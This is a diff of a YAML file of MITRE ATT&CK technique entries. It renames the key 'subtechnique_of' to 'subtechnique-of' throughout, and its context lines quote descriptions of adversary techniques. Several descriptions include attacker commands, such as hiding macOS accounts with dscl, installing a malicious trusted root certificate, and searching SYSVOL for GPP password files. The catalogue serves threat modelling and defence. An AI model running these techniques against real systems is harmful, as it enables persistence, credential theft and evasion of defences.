@@ -3736,7 +4061,7 @@
     non-existent or deprovisioned resources. In such cases, an adversary may take
     control of a subdomain to conduct operations with the benefit of the trust associated
     with that domain.(Citation: Microsoft Sub Takeover 2020)'
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1601.002
@@ -3760,7 +4085,7 @@
     defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading
     of a system image can be done on its own, or it can be used in conjunction with
     [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  '
-  subtechnique_of: T1601
+  subtechnique-of: T1601
   tactics:
   - TA0005
 - id: T1189
@@ -3825,7 +4150,7 @@
     If the program is configured to run at a higher privilege level than the current
     user, then when the dylib is loaded into the application, the dylib will also
     run at that elevated level.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -3857,7 +4182,7 @@
     SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary
     operating on a compromised machine who does not have direct access to a [Command
     and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).'
-  subtechnique_of: T1559
+  subtechnique-of: T1559
   tactics:
   - TA0002
 - id: T1568
@@ -3900,7 +4225,7 @@
     \ memory, system/network resources, and possibly elevated privileges. Execution\
     \ via DLL injection may also evade detection from security products since the\
     \ execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -3928,7 +4253,7 @@
     \ 2019) This technique has also been shown to work by modifying legitimate programs\
     \ present on the machine that make use of this API.(Citation: Death by 1000 installers;\
     \ it's all broken!)"
-  subtechnique_of: T1548
+  subtechnique-of: T1548
   tactics:
   - TA0004
   - TA0005
@@ -3944,7 +4269,7 @@
     PowerShell cmdlet can be used to obtain email addresses and accounts from a domain
     using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation:
     Black Hills Attacking Exchange MailSniper, 2016)'
-  subtechnique_of: T1087
+  subtechnique-of: T1087
   tactics:
   - TA0007
 - id: T1585.002
@@ -3963,7 +4288,7 @@
 
     To decrease the chance of physically tying back operations to themselves, adversaries
     may make use of disposable email services.(Citation: Trend Micro R980 2016)'
-  subtechnique_of: T1585
+  subtechnique-of: T1585
   tactics:
   - TA0042
 - id: T1586.002
@@ -3989,7 +4314,7 @@
 
     Adversaries can use a compromised email account to hijack existing email threads
     with targets of interest.'
-  subtechnique_of: T1586
+  subtechnique-of: T1586
   tactics:
   - TA0042
 - id: T1589.002
@@ -4008,7 +4333,7 @@
     or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
     operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)),
     and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).'
-  subtechnique_of: T1589
+  subtechnique-of: T1589
   tactics:
   - TA0043
 - id: T1114
@@ -4037,7 +4362,7 @@
     \ credentials) can create rules to automatically forward all received messages\
     \ to another recipient, forward emails to different locations based on the sender,\
     \ and more."
-  subtechnique_of: T1114
+  subtechnique-of: T1114
   tactics:
   - TA0009
 - id: T1546.014
@@ -4067,7 +4392,7 @@
     macos persist Jun 2019) Adversaries may also be able to escalate privileges from
     administrator to root as the emond service is executed with root privileges by
     the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -4089,7 +4414,7 @@
     operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
     and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
     or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).'
-  subtechnique_of: T1589
+  subtechnique-of: T1589
   tactics:
   - TA0043
 - id: T1573
@@ -4216,7 +4541,7 @@
     if there is no match, the use of environmental keying will involve checking for
     an expected target-specific value that must match for decryption and subsequent
     execution to be successful.'
-  subtechnique_of: T1480
+  subtechnique-of: T1480
   tactics:
   - TA0005
 - id: T1585
@@ -4283,7 +4608,7 @@
     while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)),
     so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock,
     D. - Defending O365 - 2019)'
-  subtechnique_of: T1098
+  subtechnique-of: T1098
   tactics:
   - TA0003
 - id: T1574.005
@@ -4321,7 +4646,7 @@
     are Vulnerable) If the executing process is set to run at a specific time or during
     a certain event (e.g., system bootup) then this technique can also be used for
     persistence.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -4378,7 +4703,7 @@
     \ as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.\
     \ Adversaries may opt to use these encrypted mechanisms that are baked into a\
     \ protocol. "
-  subtechnique_of: T1048
+  subtechnique-of: T1048
   tactics:
   - TA0010
 - id: T1011.001
@@ -4394,7 +4719,7 @@
     Bluetooth connections might not be secured or defended as well as the primary
     Internet-connected channel because it is not routed through the same enterprise
     network.'
-  subtechnique_of: T1011
+  subtechnique-of: T1011
   tactics:
   - TA0010
 - id: T1041
@@ -4448,7 +4773,7 @@
     \ in multiple layers of encryption (in protocols that are natively encrypted such\
     \ as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP\
     \ or FTP). "
-  subtechnique_of: T1048
+  subtechnique-of: T1048
   tactics:
   - TA0010
 - id: T1048.003
@@ -4462,7 +4787,7 @@
     \ (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression\
     \ algorithms (such as base64) as well as embedding data within protocol headers\
     \ and fields. "
-  subtechnique_of: T1048
+  subtechnique-of: T1048
   tactics:
   - TA0010
 - id: T1567
@@ -4487,7 +4812,7 @@
     device. In certain circumstances, such as an air-gapped network compromise, exfiltration
     could occur via a USB device introduced by a user. The USB device could be used
     as the final exfiltration point or to hop between otherwise disconnected systems.
-  subtechnique_of: T1052
+  subtechnique-of: T1052
   tactics:
   - TA0010
 - id: T1567.002
@@ -4502,7 +4827,7 @@
     Examples of cloud storage services include Dropbox and Google Docs. Exfiltration
     to these cloud storage services can provide a significant amount of cover to the
     adversary if hosts within the network are already communicating with the service. '
-  subtechnique_of: T1567
+  subtechnique-of: T1567
   tactics:
   - TA0010
 - id: T1567.001
@@ -4516,7 +4841,7 @@
 
     Exfiltration to a code repository can also provide a significant amount of cover
     to the adversary if it is a popular service already used by hosts within the network. '
-  subtechnique_of: T1567
+  subtechnique-of: T1567
   tactics:
   - TA0010
 - id: T1190
@@ -4702,7 +5027,7 @@
     [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212),
     [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210),
     and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).'
-  subtechnique_of: T1587
+  subtechnique-of: T1587
   tactics:
   - TA0042
 - id: T1588.005
@@ -4740,7 +5065,7 @@
     [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212),
     [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210),
     and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1491.002
@@ -4757,7 +5082,7 @@
     by an organization or government. Similarly, website defacement may also be used
     as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:
     Trend Micro Deep Dive Into Defacement)'
-  subtechnique_of: T1491
+  subtechnique-of: T1491
   tactics:
   - TA0040
 - id: T1090.002
@@ -4781,7 +5106,7 @@
     would be investigated. Victim systems would communicate directly with the external
     proxy on the Internet and then the proxy would forward communications to the C2
     server.'
-  subtechnique_of: T1090
+  subtechnique-of: T1090
   tactics:
   - TA0011
 - id: T1133
@@ -4836,7 +5161,7 @@
     \ may allow access to the process's memory, system/network resources, and possibly\
     \ elevated privileges. Execution via EWM injection may also evade detection from\
     \ security products since the execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -4869,7 +5194,7 @@
     part of the DNS Name Server record list for the DNS zone, providing additional
     resilience for the connection. With double-flux additional hosts can act as a
     proxy to the C2 host, further insulating the true source of the C2 channel.'
-  subtechnique_of: T1568
+  subtechnique-of: T1568
   tactics:
   - TA0011
 - id: T1070.004
@@ -4886,7 +5211,7 @@
     adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106)
     functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete,
     or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)'
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1071.002
@@ -4902,7 +5227,7 @@
     \ be concealed within the transferred files. An adversary may abuse these protocols\
     \ to communicate with systems under their control within a victim network while\
     \ also mimicking normal, expected traffic. "
-  subtechnique_of: T1071
+  subtechnique-of: T1071
   tactics:
   - TA0011
 - id: T1083
@@ -4965,7 +5290,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
     or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).'
-  subtechnique_of: T1592
+  subtechnique-of: T1592
   tactics:
   - TA0043
 - id: T1495
@@ -5050,7 +5375,7 @@
     Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation:
     LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan
     2015). '
-  subtechnique_of: T1056
+  subtechnique-of: T1056
   tactics:
   - TA0009
   - TA0006
@@ -5079,7 +5404,7 @@
     \ confirmation that they want to run the program and will even provide the URL\
     \ where the application came from. However, this is all based on the file being\
     \ downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)"
-  subtechnique_of: T1553
+  subtechnique-of: T1553
   tactics:
   - TA0005
 - id: T1592
@@ -5195,7 +5520,7 @@
     \ ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using\
     \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged\
     \ access to a domain controller."
-  subtechnique_of: T1558
+  subtechnique-of: T1558
   tactics:
   - TA0006
 - id: T1061
@@ -5229,7 +5554,7 @@
     * Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\
     \nOn the SYSVOL share, adversaries may use the following command to enumerate\
     \ potential GPP XML files: <code>dir /s * .xml</code>\n"
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1592.001
@@ -5257,7 +5582,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003)
     or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).'
-  subtechnique_of: T1592
+  subtechnique-of: T1592
   tactics:
   - TA0043
 - id: T1200
@@ -5298,7 +5623,7 @@
     of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also
     fragment files across the existing file system structure in non-standard ways.(Citation:
     Kaspersky Equation QA)'
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1564.001
@@ -5327,7 +5652,7 @@
     s known hosts and keys.\n\nAdversaries can use this to their advantage to hide\
     \ files and folders anywhere on the system and evading a typical user or system\
     \ analysis that does not incorporate investigation of hidden files."
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1564.002
@@ -5344,7 +5669,7 @@
     technique with a userID under 500 (ex: <code>sudo dscl . -create /Users/username
     UniqueID 401</code>) and enabling this property (setting it to Yes), an adversary
     can conceal user accounts. (Citation: Cybereason OSX Pirrit).'
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1564.003
@@ -5366,7 +5691,7 @@
     \ but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities\
     \ to hide otherwise visible windows from users so as not to alert the user to\
     \ adversary activity on the system.(Citation: Antiquated Mac Malware)"
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1564
@@ -5447,7 +5772,7 @@
     establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
     or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or
     initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
 - id: T1591.003
@@ -5470,7 +5795,7 @@
     \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
     \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
     \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))"
-  subtechnique_of: T1591
+  subtechnique-of: T1591
   tactics:
   - TA0043
 - id: T1591.004
@@ -5494,7 +5819,7 @@
     establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
     or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial
     access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).'
-  subtechnique_of: T1591
+  subtechnique-of: T1591
   tactics:
   - TA0043
 - id: T1546.012
@@ -5537,7 +5862,7 @@
     \ by registering invalid debuggers that redirect and effectively disable various\
     \ system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec\
     \ Ushedix June 2008)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -5573,7 +5898,7 @@
     \ SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation:\
     \ Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History\
     \ Forensics)"
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1562
@@ -5639,7 +5964,7 @@
     and/or creating a host-based firewall rule to block traffic to specific hosts
     responsible for aggregating events, such as security information and event management
     (SIEM) products. '
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1027.005
@@ -5656,7 +5981,7 @@
     by anti-virus software. An adversary who can determine that the malware was quarantined
     because of its file signature may modify the file to explicitly avoid that signature,
     and then re-use the malware.'
-  subtechnique_of: T1027
+  subtechnique-of: T1027
   tactics:
   - TA0005
 - id: T1070
@@ -5792,7 +6117,7 @@
     -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>
     to install a malicious certificate as a trusted root certificate into the system
     keychain. (Citation: objective-see ay mami 2018)'
-  subtechnique_of: T1553
+  subtechnique-of: T1553
   tactics:
   - TA0005
 - id: T1218.004
@@ -5809,7 +6134,7 @@
     InstallUtil may also be used to bypass application control through use of attributes
     within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.
     (Citation: LOLBAS Installutil)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1559
@@ -5840,7 +6165,7 @@
     messages. Since internally defacing systems exposes an adversary''s presence,
     it often takes place after other intrusion goals have been accomplished.(Citation:
     Novetta Blockbuster Destructive Malware)'
-  subtechnique_of: T1491
+  subtechnique-of: T1491
   tactics:
   - TA0040
 - id: T1090.001
@@ -5862,7 +6187,7 @@
     By using a compromised internal system as a proxy, adversaries may conceal the
     true destination of C2 traffic while reducing the need for numerous connections
     to external systems.'
-  subtechnique_of: T1090
+  subtechnique-of: T1090
   tactics:
   - TA0011
 - id: T1534
@@ -5911,7 +6236,7 @@
 
     Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity
     will not result in a valid signature.'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1059.007
@@ -5935,7 +6260,7 @@
     or downloading and executing these script files as secondary payloads. Since these
     payloads are text-based, it is also very common for adversaries to obfuscate their
     content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).'
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1001.001
@@ -5947,7 +6272,7 @@
     for decoding, deciphering, or otherwise analyzing the traffic. Examples may include
     appending/prepending data with junk characters or writing junk characters between
     significant characters. '
-  subtechnique_of: T1001
+  subtechnique-of: T1001
   tactics:
   - TA0011
 - id: T1558.003
@@ -5978,7 +6303,7 @@
     \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
     \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
     \ SANS Attacking Kerberos Nov 2014)"
-  subtechnique_of: T1558
+  subtechnique-of: T1558
   tactics:
   - TA0006
 - id: T1547.006
@@ -6005,7 +6330,7 @@
     \ GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation:\
     \ Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation:\
     \ Trend Micro Skidmap)"
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -6025,7 +6350,7 @@
     \ get access to all the other credentials stored in this vault. (Citation: External\
     \ to DA, the OS X Way) By default, the passphrase for the keychain is the user\u2019\
     s logon credentials."
-  subtechnique_of: T1555
+  subtechnique-of: T1555
   tactics:
   - TA0006
 - id: T1056.001
@@ -6057,7 +6382,7 @@
     * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
     adversaries with hooks into the operating system of network devices to read raw
     keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) '
-  subtechnique_of: T1056
+  subtechnique-of: T1056
   tactics:
   - TA0009
   - TA0006
@@ -6077,7 +6402,7 @@
     \ is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE\
     \ command from the binary so that the signature isn\u2019t checked at load time.\
     \ (Citation: Malware Persistence on OS X)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -6121,7 +6446,7 @@
     resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking
     may also evade detection from security products since the execution is masked
     under a legitimate process.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -6157,7 +6482,7 @@
     \ services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).\
     \ (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub\
     \ Responder)"
-  subtechnique_of: T1557
+  subtechnique-of: T1557
   tactics:
   - TA0006
   - TA0009
@@ -6175,7 +6500,7 @@
     [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the
     Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract
     secrets from memory.(Citation: ired Dumping LSA Secrets)'
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1547.008
@@ -6194,7 +6519,7 @@
     Adversaries may target LSASS drivers to obtain persistence. By either replacing
     or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)),
     an adversary can use LSA operations to continuously execute malicious payloads.'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -6256,7 +6581,7 @@
     TechNet Blogs Credential Protection)
 
     '
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1570
@@ -6294,7 +6619,7 @@
     \ OceanLotus for OS X). They can be set up to execute when a specific user logs\
     \ in (in the specific user\u2019s directory structure) or when any user logs in\
     \ (which requires administrator privileges)."
-  subtechnique_of: T1543
+  subtechnique-of: T1543
   tactics:
   - TA0003
   - TA0004
@@ -6319,7 +6644,7 @@
     \ but the script or program that it points to has no such requirement. So, it\
     \ is possible for poor configurations to allow an adversary to modify a current\
     \ Launch Daemon\u2019s executable and gain persistence or Privilege Escalation. "
-  subtechnique_of: T1543
+  subtechnique-of: T1543
   tactics:
   - TA0003
   - TA0004
@@ -6344,7 +6669,7 @@
     -- /Path/to/thing/to/execute "arg" "arg" "arg"</code>. Adversaries can abuse this
     functionality to execute code or even bypass application control if launchctl
     is an allowed process.'
-  subtechnique_of: T1569
+  subtechnique-of: T1569
   tactics:
   - TA0002
 - id: T1053.004
@@ -6366,7 +6691,7 @@
     context of a specified account. Daemons, such as <code>launchd</code>, run with
     the permissions of the root user account, and will operate regardless of which
     user account is logged in.'
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -6393,7 +6718,7 @@
     \ a required step for many techniques, such as establishing Persistence via [.bash_profile\
     \ and .bashrc](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking\
     \ other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)."
-  subtechnique_of: T1222
+  subtechnique-of: T1222
   tactics:
   - TA0005
 - id: T1136.001
@@ -6408,7 +6733,7 @@
 
     Such accounts may be used to establish secondary credentialed access that do not
     require persistent remote access tools to be deployed on the system.'
-  subtechnique_of: T1136
+  subtechnique-of: T1136
   tactics:
   - TA0003
 - id: T1087.001
@@ -6424,7 +6749,7 @@
     <code>groups</code>on macOS and Linux can list local users and groups. On Linux,
     local users can also be enumerated through the use of the <code>/etc/passwd</code>
     file.'
-  subtechnique_of: T1087
+  subtechnique-of: T1087
   tactics:
   - TA0007
 - id: T1078.003
@@ -6440,7 +6765,7 @@
     through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password
     reuse may allow the abuse of local accounts across a set of machines on a network
     for the purposes of Privilege Escalation and Lateral Movement. '
-  subtechnique_of: T1078
+  subtechnique-of: T1078
   tactics:
   - TA0005
   - TA0003
@@ -6454,7 +6779,7 @@
     or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
     Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
     and bash may be used to copy data into a staging location.
-  subtechnique_of: T1074
+  subtechnique-of: T1074
   tactics:
   - TA0009
 - id: T1114.001
@@ -6471,7 +6796,7 @@
     \ of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\\
     Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation:\
     \ Microsoft Outlook Files)"
-  subtechnique_of: T1114
+  subtechnique-of: T1114
   tactics:
   - TA0009
 - id: T1069.001
@@ -6487,7 +6812,7 @@
     Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039)
     utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on
     Linux can list local groups.'
-  subtechnique_of: T1069
+  subtechnique-of: T1069
   tactics:
   - TA0007
 - id: T1037.002
@@ -6506,7 +6831,7 @@
     additional malicious code. There can only be one login hook at a time though and
     depending on the access configuration of the hooks, either local credentials or
     an administrator account may be necessary. '
-  subtechnique_of: T1037
+  subtechnique-of: T1037
   tactics:
   - TA0003
   - TA0004
@@ -6523,7 +6848,7 @@
     Adversaries may use these scripts to maintain persistence on a single system.
     Depending on the access configuration of the logon scripts, either local credentials
     or an administrator account may be necessary. '
-  subtechnique_of: T1037
+  subtechnique-of: T1037
   tactics:
   - TA0003
   - TA0004
@@ -6544,7 +6869,7 @@
     so when it is used this way it can execute arbitrary code and bypass application
     control defenses that are configured to allow MSBuild.exe execution.(Citation:
     LOLBAS Msbuild)'
-  subtechnique_of: T1127
+  subtechnique-of: T1127
   tactics:
   - TA0005
 - id: T1071.003
@@ -6560,7 +6885,7 @@
     \ could also be concealed within the email messages themselves. An adversary may\
     \ abuse these protocols to communicate with systems under their control within\
     \ a victim network while also mimicking normal, expected traffic. "
-  subtechnique_of: T1071
+  subtechnique-of: T1071
   tactics:
   - TA0011
 - id: T1134.003
@@ -6572,7 +6897,7 @@
     for the user using the <code>LogonUser</code> function. The function will return
     a copy of the new session's access token and the adversary can use <code>SetThreadToken</code>
     to assign the token to a thread.
-  subtechnique_of: T1134
+  subtechnique-of: T1134
   tactics:
   - TA0005
   - TA0004
@@ -6596,7 +6921,7 @@
     such as when an adversary places a file in a shared directory or on a user''s
     desktop hoping that a user will click on it. This activity may also be seen shortly
     after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).'
-  subtechnique_of: T1204
+  subtechnique-of: T1204
   tactics:
   - TA0002
 - id: T1204.001
@@ -6610,7 +6935,7 @@
     of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).
     Links may also lead users to download files that require execution via [Malicious
     File](https://attack.mitre.org/techniques/T1204/002).
-  subtechnique_of: T1204
+  subtechnique-of: T1204
   tactics:
   - TA0002
 - id: T1587.001
@@ -6637,7 +6962,7 @@
     adversaries to obtain additional infrastructure. For example, malware developed
     that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation:
     FireEye APT29)'
-  subtechnique_of: T1587
+  subtechnique-of: T1587
   tactics:
   - TA0042
 - id: T1588.001
@@ -6656,7 +6981,7 @@
     (including Malware-as-a-Service, or MaaS), or from individuals. In addition to
     purchasing malware, adversaries may steal and repurpose malware from third-party
     entities (including other adversaries).'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1185
@@ -6723,7 +7048,7 @@
     Tasks or services contain other fields, such as a description, that adversaries
     may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation:
     Fysbis Dr Web Analysis)'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1036
@@ -6754,7 +7079,7 @@
 
 
     Adversaries may also use the same icon of the file they are trying to mimic.'
-  subtechnique_of: T1036
+  subtechnique-of: T1036
   tactics:
   - TA0005
 - id: T1556
@@ -6855,7 +7180,7 @@
     \ for its potential use. Since mshta.exe executes outside of the Internet Explorer's\
     \ security context, it also bypasses browser security settings. (Citation: LOLBAS\
     \ Mshta)"
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1218.007
@@ -6872,7 +7197,7 @@
     Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe
     can be used to bypass application control solutions that do not account for its
     potential abuse.'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1104
@@ -6920,7 +7245,7 @@
     \ method in order to allow the adversaries to cross the protected network boundary\
     \ of the Internet perimeter and into the organization\u2019s WAN. Protocols such\
     \ as ICMP may be used as a transport."
-  subtechnique_of: T1090
+  subtechnique-of: T1090
   tactics:
   - TA0011
 - id: T1026
@@ -6963,7 +7288,7 @@
     * Invoke-NinjaCopy
 
     '
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1564.004
@@ -6985,7 +7310,7 @@
     of directly in files. This may be done to evade some defenses, such as static
     indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess
     NTFS EA) (Citation: MalwareBytes ADS July 2015)'
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1106
@@ -7039,7 +7364,7 @@
     software (ex: VPN) is present on the system that executes netsh.exe as part of
     its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation:
     Demaske Netsh Persistence)'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -7068,7 +7393,7 @@
     \  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)\
     \ to change the operating system of a network device, implementing their own custom\
     \ NAT mechanisms to further obscure their activities"
-  subtechnique_of: T1599
+  subtechnique-of: T1599
   tactics:
   - TA0005
 - id: T1599
@@ -7153,7 +7478,7 @@
     If so, access is granted. Otherwise, the implanted code will pass the credentials
     on for verification of potentially valid credentials.(Citation: FireEye - Synful
     Knock)'
-  subtechnique_of: T1556
+  subtechnique-of: T1556
   tactics:
   - TA0006
   - TA0005
@@ -7174,7 +7499,7 @@
     \ data, modify startup configuration parameters to load malicious system software,\
     \ or to disable security features or logging to avoid detection. (Citation: Cisco\
     \ Synful Knock Evolution)"
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1602.002
@@ -7196,7 +7521,7 @@
     Cisco Blog Legacy Device Attacks) These tools may be used to query specific data
     from a configuration repository or configure the device to export the configuration
     for later analysis. '
-  subtechnique_of: T1602
+  subtechnique-of: T1602
   tactics:
   - TA0009
 - id: T1037.003
@@ -7211,7 +7536,7 @@
     Adversaries may use these scripts to maintain persistence on a network. Depending\
     \ on the access configuration of the logon scripts, either local credentials or\
     \ an administrator account may be necessary."
-  subtechnique_of: T1037
+  subtechnique-of: T1037
   tactics:
   - TA0003
   - TA0004
@@ -7238,7 +7563,7 @@
     establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
 - id: T1046
@@ -7262,7 +7587,7 @@
     when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example
     utility that can be used to remove network share connections with the <code>net
     use \\system\share /delete</code> command. (Citation: Technet Net Use)'
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1135
@@ -7326,7 +7651,7 @@
     establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
     or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or
     initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
